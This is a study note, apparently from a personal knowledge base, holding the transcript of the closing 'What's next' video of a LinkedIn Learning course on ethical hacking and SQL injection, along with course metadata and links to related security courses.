> **[0:07](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-s-next?u=76281980&t=7)** This course is an important step along your learning path, which leads to becoming a professional pen tester.
>
> **[0:12](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-s-next?u=76281980&t=12)** Web is a major attack surface, and SQL injections are one of the key web attacks used by cyber criminals and nation state attackers.
>
> **[0:21](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-s-next?u=76281980&t=21)** There's always something new in cybersecurity.
>
> **[0:24](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-s-next?u=76281980&t=24)** And if you're interested in learning more, then check out the full security segment of the library where new courses are added regularly.
>
> **[0:31](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-s-next?u=76281980&t=31)** You'll find courses on all aspects of security.
>
> **[0:35](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-s-next?u=76281980&t=35)** I'd also invite you to go to my author page, where you can find some additional pen testing courses, as well as a wider coverage of cybersecurity.
>
> **[0:43](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-s-next?u=76281980&t=43)** If you want to get hands-on with Android, then do take a look at "Mobile Devices and Platforms," and "Securing Android Apps."
>
> **[0:50](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-s-next?u=76281980&t=50)** If you're wanting to learn about security for the cloud, then "Cybersecurity for Cloud Computing" is for you.
>
> **[0:56](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-s-next?u=76281980&t=56)** You'll also find courses on the security aspects of wireless, websites, and the Internet of Things.
>
> **[1:02](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-s-next?u=76281980&t=62)** Thanks again for joining me on this course.
>
> **[1:05](https://www.linkedin.com/learning/ethical-hacking-sql-injection/what-s-next?u=76281980&t=65)** And I hope to see you again soon for more courses on pen testing and cybersecurity.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Cybersecurity]] (4), [[Security]] (4), [[SQL]] (2), web (2), [[Android]] (2)
> **CLI Commands:** find (3)
> **Env Vars:** sql (2)
> **Definitions:** is an  (1), is a  (1)
> **UI Navigation:** go to (1)
> **Speakers:** - [malcolm] (1)


## Instructor

- [[Malcolm Shore]]

## Resources

- Exercise files available

## Skills Covered

- SQL Injection
- Ethical Hacking

## Path Context

### In [[Become an Ethical Hacker]]
← [[Ethical Hacking- Cloud Computing]] | **19 of 19**

## Appears In

- [[Become an Ethical Hacker]]

## Related Courses

_Courses sharing skills:_

- [[Offensive Penetration Testing]] — Ethical Hacking
- [[Stealth Penetration Testing with Advanced Enumeration]] — Ethical Hacking
- [[Kali Linux for Advanced Pen Testing and Ethical Hacking]] — Ethical Hacking
- [[Ethical Hacking- Cloud Computing]] — Ethical Hacking
- [[Ethical Hacking- Cryptography]] — Ethical Hacking

---

[↑ Back to top](#)